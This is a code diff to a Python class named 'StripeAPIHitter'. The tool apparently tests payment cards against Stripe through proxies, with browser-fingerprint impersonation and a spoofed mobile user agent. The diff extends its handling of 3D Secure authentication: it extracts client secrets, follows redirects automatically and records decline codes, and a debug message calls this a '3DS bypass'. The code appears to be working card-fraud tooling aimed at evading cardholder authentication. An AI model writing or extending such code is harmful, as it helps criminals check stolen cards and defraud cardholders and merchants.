@@ -736,8 +736,12 @@ def extract_intent_details(d):
             elif isinstance(val, str) and (val.startswith('pi_') or val.startswith('seti_')):
                 intent_id = val
         
-        intent_id = d.get('id') or intent_id
-        client_secret = d.get('client_secret') or client_secret
+        cs_client_secret = d.get('payment_intent_client_secret') or d.get('setup_intent_client_secret')
+        if cs_client_secret:
+            client_secret = cs_client_secret
+
+        intent_id = intent_id or d.get('id')
+        client_secret = client_secret or d.get('client_secret')
         if intent_id and client_secret:
             return intent_id, client_secret
             
@@ -1414,7 +1418,10 @@ class StripeAPIHitter:
                                 is_legacy_3ds = (
                                     res.get("status") == "requires_source_action"
                                     or sdk.get("type") == "three_d_secure_redirect"
+                                    or next_action.get("type") == "redirect_to_url"
                                 )
+                                processed_auth = False
+
                                 if is_legacy_3ds:
                                     redirect_url = sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
                                     if isinstance(redirect_url, str):
@@ -1424,6 +1431,7 @@ class StripeAPIHitter:
                                         }
                                         await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     state = "redirected"
+                                    processed_auth = True
                                 elif source:
                                     # authenticate is an SDK-facing endpoint — use Android UA (mobile SDK path)
                                     _auth_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
@@ -1468,10 +1476,18 @@ class StripeAPIHitter:
                                         state = auth_json.get("state")
                                     except Exception:
                                         state = "3DS Attempt failed"
+                                    processed_auth = True
+                                else:
+                                    result['decline_code'] = 'no_3ds_source'
+                                    result['error'] = f'3DS required but no source or redirect URL found'
+                                    result['raw_response'] = confirm_json
+                                    return result
 
+                                if processed_auth:
                                     if state == "challenge_required":
                                         result['decline_code'] = 'challenge_required'
                                         result['error'] = 'challenge_required'
+                                        result['raw_response'] = confirm_json
                                         return result
 
                                     is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
@@ -1512,11 +1528,6 @@ class StripeAPIHitter:
                                         result['decline_code'] = status_2 or '3ds_unknown'
                                         result['error'] = f"3ds_challenge_unresolved"
                                     result['raw_response'] = poll_json
-                                    return result
-                                else:
-                                    result['decline_code'] = 'no_3ds_source'
-                                    result['error'] = f'3DS required but no source found in next_action'
-                                    result['raw_response'] = confirm_json
                                     return result
                         except Exception as ex:
                             print(f"DEBUG: 3DS bypass failed: {ex}")
